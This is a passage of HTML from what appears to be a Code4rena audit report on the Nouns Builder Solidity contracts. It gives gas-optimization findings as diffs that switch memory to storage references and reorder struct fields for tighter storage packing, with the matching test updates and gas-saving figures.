proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 358     :-        Proposal memory proposal = proposals[_proposalId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      358:+        Proposal storage proposal = proposals[_proposalId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    359, 359:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    360, 360:         // Cannot realistically underflow and `getVotes` would revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    361, 361:         unchecked {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/governance/governor/Governor.sol b/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index ca5600a..67db726 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -505,7 +505,7 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    505, 505:             uint256</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    506, 506:         )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    507, 507:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 508     :-        Proposal memory proposal = proposals[_proposalId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      508:+        Proposal storage proposal = proposals[_proposalId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    509, 509:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    510, 510:         return (proposal.againstVotes, proposal.forVotes, proposal.abstainVotes);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    511, 511:     }</span></span></span></code></pre>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/lib/token/ERC721Votes.sol\">src/lib/token/ERC721Votes.sol</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/lib/token/ERC721Votes.sol b/src/lib/token/ERC721Votes.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 3e64720..c5759cd 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/lib/token/ERC721Votes.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/lib/token/ERC721Votes.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -87,7 +87,7 @@ abstract contract ERC721Votes is IERC721Votes, EIP712, ERC721 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    87,  87:             uint256 middle;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    88,  88:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    89,  89:             // Used to temporarily hold a checkpoint</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  90     :-            Checkpoint memory cp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       90:+            Checkpoint storage cp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    91,  91:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    92,  92:             // While a valid checkpoint is to be found:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    93,  93:             while (high &gt; low) {</span></span></span></code></pre>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol\">src/token/metadata/MetadataRenderer.sol</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/token/metadata/MetadataRenderer.sol b/src/token/metadata/MetadataRenderer.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 7a140ec..070da5f 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/token/metadata/MetadataRenderer.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/token/metadata/MetadataRenderer.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -231,7 +231,7 @@ contract MetadataRenderer is IPropertyIPFSMetadataRenderer, UUPS, Ownable, Metad</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    231, 231:                 bool isLast = i == lastProperty;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    232, 232:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    233, 233:                 // Get a copy of the property</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 234     :-                Property memory property = properties[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      234:+                Property storage property = properties[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    235, 235:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    236, 236:                 // Get the token&#39;s generated attribute</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    237, 237:                 uint256 attribute = tokenAttributes[i + 1];</span></span></span></code></pre>\n<p><strong>Controversial (Not included in estimation):</strong></p>\n<p>Saved in deploy: 25433, but lost 100-300 gas per user</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol\">src/governance/governor/Governor.sol</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/governance/governor/Governor.sol b/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index ca5600a..b47413f 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -412,7 +412,7 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    412, 412:     /// @param _proposalId The proposal id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    413, 413:     function state(bytes32 _proposalId) public view returns (ProposalState) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    414, 414:         // Get a copy of the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 415     :-        Proposal memory proposal = proposals[_proposalId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      415:+        Proposal storage proposal = proposals[_proposalId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    416, 416:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    417, 417:         // Ensure the proposal exists</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    418, 418:         if (proposal.voteStart == 0) revert PROPOSAL_DOES_NOT_EXIST();</span></span></span></code></pre>\n<h2 id=\"g-02-state-variables-can-be-packed-into-fewer-storage-slots-1-instances\" style=\"position:relative;\"><a href=\"#g-02-state-variables-can-be-packed-into-fewer-storage-slots-1-instances\" aria-label=\"g 02 state variables can be packed into fewer storage slots 1 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] State variables can be packed into fewer storage slots (1 instances)</h2>\n<p>Deployment Gas Saved: <strong>99 511</strong><br>\n<code>forge snapshot --diff</code>: <strong>1 080</strong> Gas Saved</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol\">src/auction/Auction.sol</a></li>\n</ul>\n<p>Storage:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/*external inheritance:*/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">;       </span><span class=\"mtk3\">// 20</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_pendingOwner</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// 20</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_status</span><span class=\"mtk1\">;      </span><span class=\"mtk3\">// 32</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_initialized</span><span class=\"mtk1\">;   </span><span class=\"mtk3\">// 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_initializing</span><span class=\"mtk1\">;   </span><span class=\"mtk3\">// 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_paused</span><span class=\"mtk1\">;         </span><span class=\"mtk3\">// 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/* self storage */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Settings</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/*</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">address treasury;              // 20</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">uint40 duration;               // 5</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">uint40 timeBuffer;             // 5</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">uint8 minBidIncrement;         // 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">uint256 reservePrice;          // 32</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">*/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Token</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">;            </span><span class=\"mtk3\">// 20</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Auction</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/*</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">uint256 tokenId;               // 32</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">uint256 highestBid;            // 32</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">address highestBidder;         // 20</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">uint40 startTime;              // 5</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">uint40 endTime;                // 5</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">bool settled;                  // 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">*/</span></span></span></code></pre>\n<p>Fix:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/auction/types/AuctionTypesV1.sol b/src/auction/types/AuctionTypesV1.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index ae90c6c..8fb4241 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/auction/types/AuctionTypesV1.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/auction/types/AuctionTypesV1.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -12,10 +12,10 @@ contract AuctionTypesV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    12,  12:     /// @param minBidIncrement The minimum percentage an incoming bid must raise the highest bid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    13,  13:     /// @param reservePrice The reserve price of each auction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    14,  14:     struct Settings {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  15     :-        address treasury;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       15:+        uint8 minBidIncrement;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    16,  16:         uint40 duration;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    17,  17:         uint40 timeBuffer;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  18     :-        uint8 minBidIncrement;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       18:+        address treasury;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    19,  19:         uint256 reservePrice;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    20,  20:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    21,  21:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -27,11 +27,11 @@ contract AuctionTypesV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    27,  27:     /// @param endTime The timestamp the auction ends</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    28,  28:     /// @param settled If the auction has been settled</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    29,  29:     struct Auction {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  30     :-        uint256 tokenId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  31     :-        uint256 highestBid;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  32     :-        address highestBidder;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    33,  30:         uint40 startTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    34,  31:         uint40 endTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    35,  32:         bool settled;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       33:+        address highestBidder;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       34:+        uint256 tokenId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       35:+        uint256 highestBid;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    36,  36:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    37,  37: }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/test/Auction.t.sol b/test/Auction.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b664078..bf2c2e5 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/Auction.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/Auction.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -44,7 +44,7 @@ contract AuctionTest is NounsBuilderTest {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    44,  44:         assertEq(token.ownerOf(1), founder2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    45,  45:         assertEq(token.ownerOf(2), address(auction));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    46,  46:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  47     :-        (uint256 tokenId, uint256 highestBid, address highestBidder, uint256 startTime, uint256 endTime, bool settled) = auction.auction();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       47:+        (uint256 startTime, uint256 endTime, bool settled, address highestBidder, uint256 tokenId, uint256 highestBid) = auction.auction();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    48,  48:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    49,  49:         assertEq(tokenId, 2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    50,  50:         assertEq(highestBid, 0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -71,7 +71,7 @@ contract AuctionTest is NounsBuilderTest {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    71,  71:         vm.prank(bidder1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    72,  72:         auction.createBid{ value: _amount }(2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    73,  73:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  74     :-        (, uint256 highestBid, address highestBidder, , , ) = auction.auction();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       74:+        (, , , address highestBidder, , uint256 highestBid) = auction.auction();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    75,  75:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    76,  76:         assertEq(highestBid, _amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    77,  77:         assertEq(highestBidder, bidder1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -123,7 +123,7 @@ contract AuctionTest is NounsBuilderTest {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">123, 123:         assertEq(bidder2BeforeBalance - bidder2AfterBalance, 0.5 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">124, 124:         assertEq(address(auction).balance, 0.5 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">125, 125:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 126     :-        (, uint256 highestBid, address highestBidder, , , ) = auction.auction();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      126:+       (, , , address highestBidder, , uint256 highestBid) = auction.auction();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">127, 127:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">128, 128:         assertEq(highestBid, 0.5 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">129, 129:         assertEq(highestBidder, bidder2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -155,7 +155,7 @@ contract AuctionTest is NounsBuilderTest {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">155, 155:         vm.prank(bidder2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">156, 156:         auction.createBid{ value: 1 ether }(2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">157, 157:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 158     :-        (, , , , uint256 endTime, ) = auction.auction();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      158:+        (, uint256 endTime, , ,, ) = auction.auction();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">159, 159:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">160, 160:         assertEq(endTime, 14 minutes);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">161, 161:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -237,7 +237,7 @@ contract AuctionTest is NounsBuilderTest {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">237, 237:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">238, 238:         auction.settleAuction();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">239, 239:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 240     :-        (, , , , , bool settled) = auction.auction();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      240:+        (, , bool settled, , , ) = auction.auction();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">241, 241:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">242, 242:         assertEq(settled, true);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">243, 243:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/test/utils/NounsBuilderTest.sol b/test/utils/NounsBuilderTest.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index cb17d6b..ccabc62 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/utils/NounsBuilderTest.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/utils/NounsBuilderTest.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -240,7 +240,7 @@ contract NounsBuilderTest is Test {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">240, 240:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">241, 241:         unchecked {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">242, 242:             for (uint256 i; i &lt; _numTokens; ++i) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 243     :-                (uint256 tokenId, , , , , ) = auction.auction();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      243:+                (, , , , uint256 tokenId, ) = auction.auction();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">244, 244:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">245, 245:                 vm.prank(otherUsers[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">246, 246:                 auction.createBid{ value: reservePrice }(tokenId);</span></span></span></code></pre>\n<h2 id=\"g-03-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage-5-instances\" style=\"position:relative;\"><a href=\"#g-03-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage-5-instances\" aria-label=\"g 03 state variables should be cached in stack variables rather than re reading them from storage 5 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] State variables should be cached in stack variables rather than re-reading them from storage (5 instances)</h2>\n<p>Deployment Gas Saved: <strong>70 505</strong><br>\nMethod Call Gas Saved: <strong>2 634</strong><br>\n<code>forge 